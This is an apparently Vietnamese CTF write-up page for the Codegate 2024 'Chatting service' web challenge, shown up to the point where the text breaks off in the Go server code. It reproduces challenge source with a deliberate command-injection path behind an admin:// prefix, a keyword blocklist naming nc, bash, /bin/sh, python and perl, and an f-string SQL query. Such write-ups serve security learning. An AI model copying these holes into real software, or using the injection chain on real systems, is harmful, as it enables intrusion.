@@ -1,0 +1,1399 @@
+
+
+<!DOCTYPE html>
+<html lang="en" itemscope itemtype="http://schema.org/WebPage">
+  <head>
+    
+
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+
+  <title>CodegateCTF 2024 quals - &gt; root@l3mnt2010:~# ./exploit.py</title>
+  <meta name="description" content="code gate 2024 quals  Chatting service  flag server go server Flow &#43; exploit   Master_of_calculator    .toc-container {position: fixed;left: 0;top: 100px; width: 350px; max-height: 80vh;overflow-y: auto;overflow-x: auto;padding: 20px;border-right: 1px solid #eee;background-color: black; z-index: 100;text-align: left; }.toc {font-size: 1.3rem; color: #fff; text-align: left; }.toc h4 {margin-top: 0;margin-bottom: 1rem;font-size: 1.">
+  <meta name="author" content="l3mnt2010"/><script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "WebSite",
+    "name": "\u003e root@l3mnt2010:~# .\/exploit.py",
+    
+    "url": "https:\/\/l3mnt2010.github.io\/"
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Organization",
+  "name": "",
+  "url": "https:\/\/l3mnt2010.github.io\/"
+  
+  
+  
+  
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [{
+        "@type": "ListItem",
+        "position": 1,
+        "item": {
+          "@id": "https:\/\/l3mnt2010.github.io\/",
+          "name": "home"
+        }
+    },{
+        "@type": "ListItem",
+        "position": 3,
+        "item": {
+          "@id": "https:\/\/l3mnt2010.github.io\/write-up\/2024-04-17-codegatectf2024quals\/",
+          "name": "Codegate ctf 2024 quals"
+        }
+    }]
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "author": {
+    "name" : ""
+  },
+  "headline": "CodegateCTF 2024 quals",
+  "description" : "code gate 2024 quals  Chatting service  flag server go server Flow \u002b exploit   Master_of_calculator    \r\r\r\r\r.toc-container {\rposition: fixed;\rleft: 0;\rtop: 100px; width: 350px; max-height: 80vh;\roverflow-y: auto;\roverflow-x: auto;\rpadding: 20px;\rborder-right: 1px solid #eee;\rbackground-color: black; z-index: 100;\rtext-align: left; }\r.toc {\rfont-size: 1.3rem; color: #fff; text-align: left; }\r.toc h4 {\rmargin-top: 0;\rmargin-bottom: 1rem;\rfont-size: 1.",
+  "inLanguage" : "en",
+  "wordCount":  3448 ,
+  "datePublished" : "0001-01-01T00:00:00\u002b00:00",
+  "dateModified" : "0001-01-01T00:00:00\u002b00:00",
+  "image" : "https:\/\/l3mnt2010.github.io\/avatar.png",
+  "keywords" : [ "CTF, Vietnamese" ],
+  "mainEntityOfPage" : "https:\/\/l3mnt2010.github.io\/write-up\/2024-04-17-codegatectf2024quals\/",
+  "publisher" : {
+    "@type": "Organization",
+    "name" : "https:\/\/l3mnt2010.github.io\/",
+    "logo" : {
+        "@type" : "ImageObject",
+        "url" : "https:\/\/l3mnt2010.github.io\/avatar.png",
+        "height" :  60 ,
+        "width" :  60
+    }
+  }
+}
+</script>
+
+
+<meta property="og:title" content="CodegateCTF 2024 quals" />
+<meta property="og:description" content="code gate 2024 quals  Chatting service  flag server go server Flow &#43; exploit   Master_of_calculator    .toc-container {position: fixed;left: 0;top: 100px; width: 350px; max-height: 80vh;overflow-y: auto;overflow-x: auto;padding: 20px;border-right: 1px solid #eee;background-color: black; z-index: 100;text-align: left; }.toc {font-size: 1.3rem; color: #fff; text-align: left; }.toc h4 {margin-top: 0;margin-bottom: 1rem;font-size: 1.">
+<meta property="og:image" content="https://l3mnt2010.github.io/avatar.png" />
+<meta property="og:url" content="https://l3mnt2010.github.io/write-up/2024-04-17-codegatectf2024quals/" />
+<meta property="og:type" content="website" />
+<meta property="og:site_name" content="&gt; root@l3mnt2010:~# ./exploit.py" />
+
+  <meta name="twitter:title" content="CodegateCTF 2024 quals" />
+  <meta name="twitter:description" content="code gate 2024 quals  Chatting service  flag server go server Flow &#43; exploit   Master_of_calculator    .toc-container {position: fixed;left: 0;top: 100px; width: 350px; max-height: 80vh; …">
+  <meta name="twitter:image" content="https://l3mnt2010.github.io/avatar.png" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <link href='https://l3mnt2010.github.io/avatar.png' rel='icon' type='image/x-icon'/>
+  <meta name="generator" content="Hugo 0.83.1" />
+  <link rel="alternate" href="https://l3mnt2010.github.io/index.xml" type="application/rss+xml" title="&gt; root@l3mnt2010:~# ./exploit.py"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"><link rel="stylesheet" href="https://l3mnt2010.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="https://l3mnt2010.github.io/css/syntax.css" /><link rel="stylesheet" href="https://l3mnt2010.github.io/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">
+
+
+
+  </head>
+  <body>
+    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="https://l3mnt2010.github.io/">&gt; root@l3mnt2010:~# ./exploit.py</a>
+    </div>
+
+    <div class="collapse navbar-collapse" id="main-navbar">
+      <ul class="nav navbar-nav navbar-right">
+        
+          
+            <li>
+              <a title="Home" href="https://l3mnt2010.github.io/">Home</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Posts" href="https://l3mnt2010.github.io/posts">Posts</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Write-up CTF" href="https://l3mnt2010.github.io/write-up">Write-up CTF</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Tags" href="https://l3mnt2010.github.io/tags">Tags</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="About" href="https://l3mnt2010.github.io/about">About</a>
+            </li>
+          
+        
+
+        
+
+        
+      </ul>
+    </div>
+
+    
+      <div class="avatar-container">
+        <div class="avatar-img-border">
+          <a title="&gt; root@l3mnt2010:~# ./exploit.py" href="https://l3mnt2010.github.io/">
+            <img class="avatar-img" src="https://l3mnt2010.github.io/avatar.png" alt="&gt; root@l3mnt2010:~# ./exploit.py" />
+           
+          </a>
+        </div>
+      </div>
+    
+
+  </div>
+</nav>
+
+
+
+
+    
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+
+  
+  
+  
+
+
+
+
+
+
+  
+
+  <header class="header-section ">
+    
+    
+    <div class="intro-header no-img">
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+            <div class="write-up-heading">
+              
+                <h1>CodegateCTF 2024 quals</h1>
+              
+              
+                <hr class="small">
+              
+              
+              
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  
+  </header>
+
+
+    
+<div class="container" role="main">
+  <div class="row">
+    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+      <article role="main" class="blog-post">
+        
+  <div class="toc-container">
+    <div class="toc">
+      <nav id="TableOfContents">
+        
+        <nav id="TableOfContents">
+  <ol>
+    <li><a href="#code-gate-2024-quals">code gate 2024 quals</a>
+      <ol>
+        <li><a href="#chatting-service">Chatting service</a>
+          <ol>
+            <li><a href="#flag-server">flag server</a></li>
+            <li><a href="#go-server">go server</a></li>
+            <li><a href="#flow--exploit">Flow + exploit</a></li>
+          </ol>
+        </li>
+        <li><a href="#master_of_calculator">Master_of_calculator</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+      </nav>
+    </div>
+  </div>
+
+  <style>
+     
+    .toc-container {
+      position: fixed;
+      left: 0;
+      top: 100px;  
+      width: 350px;  
+      max-height: 80vh;
+      overflow-y: auto;
+      overflow-x: auto;
+      padding: 20px;
+      border-right: 1px solid #eee;
+      background-color: black;  
+      z-index: 100;
+      text-align: left;  
+    }
+
+    .toc {
+      font-size: 1.3rem;  
+      color: #fff;  
+      text-align: left;  
+    }
+
+    .toc h4 {
+      margin-top: 0;
+      margin-bottom: 1rem;
+      font-size: 1.3rem;  
+      text-align: left;  
+    }
+
+     
+    .toc ul, .toc ol {
+      padding-left: 0;  
+      margin: 0;
+      list-style-type: none;
+      text-align: left;  
+    }
+
+     
+    .toc ul ul, .toc ul ol, .toc ol ul, .toc ol ol {
+      padding-left: 10px;
+    }
+
+    .toc li {
+      padding: 10px 0;
+      line-height: 1.6;
+      text-align: left;  
+    }
+
+     
+    .toc a {
+      text-decoration: none;
+      display: block;
+      text-align: left;  
+      padding-left: 3px;  
+      font-size: 1.3rem;  
+      transition: color 0.2s;
+    }
+
+     
+    .toc > nav > ul > li > a {
+      color: #bb86fc;  
+      font-weight: bold;
+    }
+
+     
+    .toc > nav > ul > li > ul > li > a {
+      color: #ff4d4d;  
+    }
+
+     
+    .toc > nav > ul > li > ul > li > ul > li > a {
+      color: #4caf50;  
+    }
+
+     
+    .toc a:hover {
+      color: #ffcc00;  
+    }
+
+     
+    .toc a.active {
+      color: #ffcc00;  
+      font-weight: bold;
+      border-left: 4px solid #ffcc00;  
+      padding-left: 3px;  
+      margin-left: -5px;
+    }
+
+     
+    .main-content {
+      margin-left: 380px;  
+    }
+
+     
+    @media (max-width: 1200px) {
+      .toc-container {
+        width: 280px;  
+      }
+      .main-content {
+        margin-left: 320px;
+      }
+    }
+
+    @media (max-width: 900px) {
+      .toc-container {
+        position: static;
+        width: 100%;
+        max-height: none;
+        border-right: none;
+        border-bottom: 1px solid #eee;
+        margin-bottom: 20px;
+      }
+      .main-content {
+        margin-left: 0;
+      }
+    }
+  </style>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      
+      function highlightTOC() {
+        const headings = document.querySelectorAll('.main-content h1, .main-content h2, .main-content h3, .main-content h4, .main-content h5, .main-content h6');
+        const tocLinks = document.querySelectorAll('.toc a');
+
+        if (headings.length === 0 || tocLinks.length === 0) return;
+
+        let currentActiveIndex = -1;
+        const scrollPosition = window.scrollY;
+
+        for (let i = 0; i < headings.length; i++) {
+          const heading = headings[i];
+          const headingTop = heading.offsetTop - 100;
+          const headingBottom = headingTop + heading.offsetHeight;
+
+          if (scrollPosition >= headingTop && scrollPosition <= headingBottom) {
+            currentActiveIndex = i;
+            break;
+          }
+        }
+
+        tocLinks.forEach(link => link.classList.remove('active'));
+
+        if (currentActiveIndex >= 0) {
+          const currentHeading = headings[currentActiveIndex];
+          const headingId = currentHeading.id;
+
+          const correspondingLink = document.querySelector(`.toc a[href="#${headingId}"]`);
+          if (correspondingLink) {
+            correspondingLink.classList.add('active');
+
+            const tocContainer = document.querySelector('.toc-container');
+            const linkTop = correspondingLink.offsetTop;
+            const containerScrollTop = tocContainer.scrollTop;
+            const containerHeight = tocContainer.clientHeight;
+
+            if (linkTop < containerScrollTop || linkTop > containerScrollTop + containerHeight) {
+              tocContainer.scrollTop = linkTop - containerHeight / 2;
+            }
+          }
+        }
+      }
+
+      highlightTOC();
+      window.addEventListener('scroll', highlightTOC);
+      window.addEventListener('resize', highlightTOC);
+
+      const fragment = window.location.hash;
+      if (fragment) {
+        const element = document.querySelector(fragment);
+        if (element) {
+          element.scrollIntoView({ behavior: 'smooth' });
+
+          const tocLinks = document.querySelectorAll('.toc a');
+          tocLinks.forEach(link => {
+            link.classList.remove('active');
+            if (link.getAttribute('href') === fragment) {
+              link.classList.add('active');
+            }
+          });
+
+          highlightTOC();
+        }
+      }
+
+      const tocLinks = document.querySelectorAll('.toc a');
+      tocLinks.forEach(link => {
+        link.addEventListener('click', function(event) {
+          const targetId = link.getAttribute('href').substring(1);
+          const targetElement = document.getElementById(targetId);
+
+          if (targetElement) {
+            targetElement.scrollIntoView({ behavior: 'smooth' });
+
+            tocLinks.forEach(l => l.classList.remove('active'));
+            link.classList.add('active');
+
+            history.pushState(null, null, `#${targetId}`);
+
+            event.preventDefault();
+          }
+        });
+      });
+    });
+  </script>  
+
+
+<h1 id="code-gate-2024-quals">code gate 2024 quals</h1>
+<h2 id="chatting-service">Chatting service</h2>
+<ul>
+<li>
+<p>Đánh giá sơ bộ thì giải này khá là khó bởi vì giải thưởng 1 tỷ vnđ $$$</p>
+</li>
+<li>
+<p>Đây là bài mình và anh Ngọc đã solved trong tab web của team. ok thì bây giờ đi vào vấn đề nhé.</p>
+</li>
+</ul>
+<pre><code>Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         5/28/2024   2:36 AM                Flask
+d-----         5/28/2024   2:36 AM                Go
+d-----         5/28/2024   2:36 AM                Memcache
+d-----         5/28/2024   2:36 AM                Mysql
+-a----         5/28/2024   2:36 AM           2175 docker-compose.yml
+</code></pre><ul>
+<li>
+<p>Chall gồm có các server như trên + dùng Flask python + golang server + mysql server + memcache server.</p>
+</li>
+<li>
+<p>Đầu tiên ta sẽ quan sát vị trí của flag.</p>
+</li>
+</ul>
+<h3 id="flag-server">flag server</h3>
+<pre><code>memcache_ip = os.environ.get('MEMCACHE_IP')
+print(f'memcache ip = {memcache_ip}')
+client = Client(memcache_ip)
+print(f'memcache client = {client}')
+
+try:
+    conn = psycopg2.connect(
+                                database=os.environ.get('DB_NAME'),
+                                user=os.environ.get('DB_USER'),
+                                password=os.environ.get('DB_PASSWORD'),
+                                host=os.environ.get('DB_HOST'),
+                                port=os.environ.get('DB_PORT')
+                        )
+except Exception as e:
+    print(e)
+
+try:       
+    client.set(&quot;flag&quot;,&quot;codegate2024{##CENSORED##}&quot;)
+except Exception as e:
+    print(f'memcache ==&gt;  {e}')
+</code></pre><ul>
+<li>Có thể thấy flag được lưu vào trong memcache server và mặc định server này chạy ở cổng 11211 localhost.</li>
+</ul>
+<pre><code>def send_command(command):
+    try:
+        print(f'will be send data : {command}')
+        client_socket = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+        client_socket.settimeout(5)
+        
+        client_socket.connect(SOCKET_PATH)
+        client_socket.sendall(command.encode())
+        
+        response = client_socket.recv(1024).decode()
+        return response
+    except socket.timeout:
+        return &quot;Invalid Command&quot;
+    except Exception as e:
+        print(e)
+        return str(e)
+
+def internalDaemonService(command):
+    if command.startswith(&quot;admin://&quot;):
+        msg = AdminMessage(message=f'{command}')
+        try:
+            mysql_session.add(msg)
+            mysql_session.commit()
+        except Exception as e:
+            print(e)
+        finally:
+            mysql_session.close()
+        
+        commandline = &quot;cd /tmp &amp;&amp;&quot;
+        tmp = command.split(&quot;admin://&quot;)[1]
+        commandline += tmp
+        client.set(f'msg', f'{tmp}')
+
+        filtered = [&quot;memccat&quot;, &quot;memcstat&quot;, &quot;memcdump&quot;, &quot;nc&quot;, &quot;bash&quot;, &quot;/bin&quot;, &quot;/sh&quot;, &quot;export&quot;, &quot;env&quot;, &quot;socket&quot;, &quot;connect&quot;, &quot;open&quot;, &quot;set&quot;, &quot;membash&quot;, &quot;delete&quot;, &quot;flush_all&quot;, &quot;stats&quot;, &quot;which&quot; , &quot;python&quot;, &quot;perl&quot;, &quot;rm&quot;, &quot;mkdir&quot;, &quot;.&quot;, &quot;/&quot;]
+
+        for _filter in filtered:
+            if _filter in tmp.lower():
+                print(f'filter data : {_filter}')
+                return &quot;FILTER MESSAGE DETECTED&quot;
+        
+        try:
+            response = send_command(commandline)
+            return response
+        except Exception as e:
+            return str(e)
+    
+    else:
+        msg = Message(message=f'{command}')
+        try:
+            mysql_session.add(msg)
+            mysql_session.commit()
+        except Exception as e:
+            print(e)
+        finally:
+            mysql_session.close()
+        return f&quot;The Message is already saved on DB : {command}&quot;
+
+def isValidateSession(username, session, command):
+    cur = conn.cursor()
+    query = f&quot;SELECT session, session_enable FROM register where username='{username}' and session='{session}'&quot;
+    print(f'query : {query}')
+    
+    if username == None or session == None:
+        return &quot;NONE&quot;
+
+    if &quot;'&quot; in username or &quot;'&quot; in session:
+        return &quot;DO NOT TRY SQL INJECTION&quot;
+    
+    try:
+        cur.execute(query)
+        result = cur.fetchone()
+        
+        if result:
+            internal_session, session_enable = result
+            if internal_session == session:
+                return internalDaemonService(command)
+            
+        else:
+            return &quot;Please recheck username or Session&quot;
+        
+    except Exception as e:
+        print(f'exception: {e}')
+    
+    return &quot;NONE&quot;
+
+
+@app.route('/')
+def index():
+    return &quot;Debug Mode&quot;
+
+@app.route(&quot;/login&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])
+def debugLoginPage():
+    response = make_response()
+    response.headers.add(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;)
+    response.headers.add('Access-Control-Allow-Headers', &quot;*&quot;)
+    response.headers.add('Access-Control-Allow-Methods', &quot;*&quot;)
+    if request.method == &quot;GET&quot;:
+        return &quot;CANNOT LOGIN YOURSELF&quot;
+    if request.method == &quot;POST&quot;:
+        try:
+            web_username = request.form.get('username') 
+            web_session = request.form.get('session')
+            command = request.form.get('command')
+            response_result = isValidateSession(web_username,web_session, command)
+        except Exception as e:
+            print(e)
+        return render_template('main.html', response_result=response_result)
+
+def init_db(Base,mysql_engine):
+    try:
+        Base.metadata.create_all(mysql_engine)
+        print('Table is creaetd.')
+    except Exception as e:
+        print(e)
+    
+
+def drop_db(Base,mysql_engine):
+    Base.metadata.drop_all(mysql_engine)
+    print('Table is removed.')
+
+if __name__ == '__main__':
+    drop_db(Base,mysql_engine)
+    init_db(Base,mysql_engine)
+    app.run(host='0.0.0.0',debug=True,port=5000)
+</code></pre><ul>
+<li>ở đây ta có thể thấy có /login là quan trọng nhất ở đây có 2 method và GET và POST , và ở đây chỉ có POST có tác dụng để khai thác, server nhận username và password từ form + command cũng từ form -&gt; kiểu tra với hàm <code>isValidateSession</code>:</li>
+</ul>
+<pre><code>def isValidateSession(username, session, command):
+    cur = conn.cursor()
+    query = f&quot;SELECT session, session_enable FROM register where username='{username}' and session='{session}'&quot;
+    print(f'query : {query}')
+    
+    if username == None or session == None:
+        return &quot;NONE&quot;
+
+    if &quot;'&quot; in username or &quot;'&quot; in session:
+        return &quot;DO NOT TRY SQL INJECTION&quot;
+    
+    try:
+        cur.execute(query)
+        result = cur.fetchone()
+        
+        if result:
+            internal_session, session_enable = result
+            if internal_session == session:
+                return internalDaemonService(command)
+            
+        else:
+            return &quot;Please recheck username or Session&quot;
+        
+    except Exception as e:
+        print(f'exception: {e}')
+    
+    return &quot;NONE&quot;
+</code></pre><ul>
+<li>Hàm này thực hiên chọn session, session_enable từ bảng register với username và session của client</li>
+<li>Tiếp đó là nếu có <code>'</code> thì nó detect sqli</li>
+<li>Sau đó nếu có result thì gọi <code>internalDaemonService</code> với command</li>
+</ul>
+<pre><code>def internalDaemonService(command):
+    if command.startswith(&quot;admin://&quot;):
+        msg = AdminMessage(message=f'{command}')
+        try:
+            mysql_session.add(msg)
+            mysql_session.commit()
+        except Exception as e:
+            print(e)
+        finally:
+            mysql_session.close()
+        
+        commandline = &quot;cd /tmp &amp;&amp;&quot;
+        tmp = command.split(&quot;admin://&quot;)[1]
+        commandline += tmp
+        client.set(f'msg', f'{tmp}')
+
+        filtered = [&quot;memccat&quot;, &quot;memcstat&quot;, &quot;memcdump&quot;, &quot;nc&quot;, &quot;bash&quot;, &quot;/bin&quot;, &quot;/sh&quot;, &quot;export&quot;, &quot;env&quot;, &quot;socket&quot;, &quot;connect&quot;, &quot;open&quot;, &quot;set&quot;, &quot;membash&quot;, &quot;delete&quot;, &quot;flush_all&quot;, &quot;stats&quot;, &quot;which&quot; , &quot;python&quot;, &quot;perl&quot;, &quot;rm&quot;, &quot;mkdir&quot;, &quot;.&quot;, &quot;/&quot;]
+
+        for _filter in filtered:
+            if _filter in tmp.lower():
+                print(f'filter data : {_filter}')
+                return &quot;FILTER MESSAGE DETECTED&quot;
+        
+        try:
+            response = send_command(commandline)
+            return response
+        except Exception as e:
+            return str(e)
+    
+    else:
+        msg = Message(message=f'{command}')
+        try:
+            mysql_session.add(msg)
+            mysql_session.commit()
+        except Exception as e:
+            print(e)
+        finally:
+            mysql_session.close()
+        return f&quot;The Message is already saved on DB : {command}&quot;
+</code></pre><ul>
+<li>Đối với hàm này nó sẽ thực hiện chạy một command nếu mà start với <code>admin://</code> thì tạo một đối tượng msg từ class:</li>
+</ul>
+<pre><code>class AdminMessage(Base):
+    __tablename__ = 'admin_message'
+    id = Column(Integer, primary_key=True, autoincrement=True)
+    message = Column(String(1000))
+</code></pre><ul>
+<li>
+<p>Tiếp theo nó sẽ add session vào mysql tạo cmd = &lsquo;cd /tmp &amp;&amp; ' + command split sau admin:// của chúng ta.</p>
+</li>
+<li>
+<p>Sau đó sẽ filter black list để tránh đọc commandi nói chung là tránh đọc flag</p>
+</li>
+</ul>
+<pre><code>filtered = [&quot;memccat&quot;, &quot;memcstat&quot;, &quot;memcdump&quot;, &quot;nc&quot;, &quot;bash&quot;, &quot;/bin&quot;, &quot;/sh&quot;, &quot;export&quot;, &quot;env&quot;, &quot;socket&quot;, &quot;connect&quot;, &quot;open&quot;, &quot;set&quot;, &quot;membash&quot;, &quot;delete&quot;, &quot;flush_all&quot;, &quot;stats&quot;, &quot;which&quot; , &quot;python&quot;, &quot;perl&quot;, &quot;rm&quot;, &quot;mkdir&quot;, &quot;.&quot;, &quot;/&quot;]
+
+        for _filter in filtered:
+            if _filter in tmp.lower():
+                print(f'filter data : {_filter}')
+                return &quot;FILTER MESSAGE DETECTED&quot;
+</code></pre><ul>
+<li>Sau đó gọi send_command với cmdline vừa được cộng chuỗi:</li>
+</ul>
+<pre><code>def send_command(command):
+    try:
+        print(f'will be send data : {command}')
+        client_socket = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+        client_socket.settimeout(5)
+        
+        client_socket.connect(SOCKET_PATH)
+        client_socket.sendall(command.encode())
+        
+        response = client_socket.recv(1024).decode()
+        return response
+    except socket.timeout:
+        return &quot;Invalid Command&quot;
+    except Exception as e:
+        print(e)
+        return str(e)
+</code></pre><ul>
+<li>sau đó thực hiện run command này và trả ra kết quả.</li>
+</ul>
+<h3 id="go-server">go server</h3>
+<ul>
+<li>Vậy là ta đã biết cách để &ldquo;vươn đến&rdquo; flag nhưng chú ý để access vào này thì ta cần phải chain thông qua hook từ go server.</li>
+</ul>
+<pre><code>r.HandleFunc(&quot;/&quot;, func(w http.ResponseWriter, r *http.Request) {
+		MainHandler(w, r, db)
+	}).Schemes(&quot;http&quot;)
+
+	r.HandleFunc(&quot;/signup&quot;, func(w http.ResponseWriter, r *http.Request) {
+		SignupHandler(w, r, db)
+	}).Schemes(&quot;http&quot;)
+
+	r.HandleFunc(&quot;/chat_entrance&quot;, func(w http.ResponseWriter, r *http.Request) {
+		ChatEntranceHandler(w, r, db)
+	}).Schemes(&quot;http&quot;)
+
+	r.HandleFunc(&quot;/api/userlist&quot;, func(w http.ResponseWriter, r *http.Request) {
+		DropDownHandler(w, r, db)
+	}).Schemes(&quot;http&quot;)
+
+	r.HandleFunc(&quot;/api/addRoom&quot;, func(w http.ResponseWriter, r *http.Request) {
+		AddRoomHandler(w, r, db)
+	}).Schemes(&quot;http&quot;)
+
+	r.HandleFunc(&quot;/api/sendMessage&quot;, func(w http.ResponseWriter, r *http.Request) {
+		MessageHandler(w, r, db)
+	}).Schemes(&quot;http&quot;)
+
+	r.HandleFunc(&quot;/api/loadMessage&quot;, func(w http.ResponseWriter, r *http.Request) {
+		LoadMessageHandler(w, r, db)
+	}).Schemes(&quot;http&quot;)
+
+	r.HandleFunc(&quot;/api/deleteRoom&quot;, func(w http.ResponseWriter, r *http.Request) {
+		DeleteRoomHandler(w, r, db)
+	}).Schemes(&quot;http&quot;)
+
+	r.HandleFunc(&quot;/api/validate&quot;, func(w http.ResponseWriter, r *http.Request) {
+		ValidateHandler(w, r, db)
+	}).Schemes(&quot;http&quot;)
+
+	r.HandleFunc(&quot;/api/logout&quot;, func(w http.ResponseWriter, r *http.Request) {
+		LogoutHandler(w, r, db)
+	}).Schemes(&quot;http&quot;)
+
+	r.HandleFunc(&quot;/api/reload&quot;, func(w http.ResponseWriter, r *http.Request) {
+		ReloadHandler(w, r, db)
+	}).Schemes(&quot;http&quot;)
+
+	r.HandleFunc(&quot;/api/hidden&quot;, func(w http.ResponseWriter, r *http.Request) {
+		HiddenHandler(w, r, db)
+	}).Schemes(&quot;http&quot;)
+</code></pre><ul>
+<li>Sau khi view qua khá kĩ các route thì mình thấy nó chain đến nhau và hook để kết nối đến flag server ở đây là <code>/api/hidden</code> và đúng như cái tên <code>hidden</code> thì đây là source của nó:</li>
+</ul>
+<pre><code>func HiddenHandler(w http.ResponseWriter, r *http.Request, db *sql.DB) {
+	var flag string
+	fmt.Println(&quot;[HiddenHandler] Entrance&quot;)
+
+	username, _ := r.Cookie(&quot;UserName&quot;)
+
+	Userdata := structure.User{
+		Id: username.Value,
+	}
+	fmt.Printf(&quot;Userdata %v\n&quot;, Userdata)
+	flag = reg.Checker(db, Userdata, 7)
+
+	if flag == &quot;0&quot; {
+		http.Error(w, &quot;ACCESS DENIED&quot;, http.StatusInternalServerError)
+	}
+
+	if flag == &quot;1&quot; {
+		if r.Method == &quot;GET&quot; {
+			page := HiddenPage{
+				Message: &quot;Welcome&quot;,
+			}
+			hiddenFullPath := Strcat(hiddenTemplate)
+			hiddenPageTemplate, err := template.ParseFiles(hiddenFullPath)
+			if err != nil {
+				http.Error(w, &quot;Internal Server Error&quot;, http.StatusInternalServerError)
+				return
+			}
+			err = hiddenPageTemplate.Execute(w, page)
+			if err != nil {
+				http.Error(w, &quot;Internal Server Error&quot;, http.StatusInternalServerError)
+				return
+			}
+
+		} else if r.Method == &quot;POST&quot; {
+			err := r.ParseForm()
+			if err != nil {
+				http.Error(w, &quot;Bad Request&quot;, http.StatusBadRequest)
+				return
+			}
+			username := r.FormValue(&quot;username&quot;)
+			session := r.FormValue(&quot;session&quot;)
+			command := r.FormValue(&quot;command&quot;)
+
+			fmt.Printf(&quot;[Hidden] username : %v\n&quot;, username)
+			fmt.Printf(&quot;[Hidden] session : %v\n&quot;, session)
+			fmt.Printf(&quot;[Hidden] command : %v\n&quot;, command)
+			return
+		}
+	}
+}
+</code></pre><ul>
+<li>nó gọi đến hàm HiddenHandler -&gt; khai báo biến flag là string -&gt; lấy username từ cookie gán cho biến username -&gt; khởi tạo Userdata với struct user</li>
+</ul>
+<pre><code>type User struct {
+	ID_num   int
+	Id       string
+	Password string
+	Session string
+	Session_enable int
+	Hidden_enable int
+}
+</code></pre><p>-&gt; gọi phương thức <code>reg.Checker(db, Userdata, 7)</code> từ module nằm trong <code>reg</code></p>
+<pre><code>func Checker(db *sql.DB, data structure.User, choice int) string {
+	switch choice {
+	case 1:
+		var session string
+		err := db.QueryRow(&quot;SELECT session FROM register WHERE username = $1&quot;, data.Id).Scan(&amp;session)
+		if err != nil {
+			fmt.Printf(&quot;Checker Case 1 err ==&gt; %v\n&quot;, err)
+		}
+		return session
+	case 2:
+		var username string
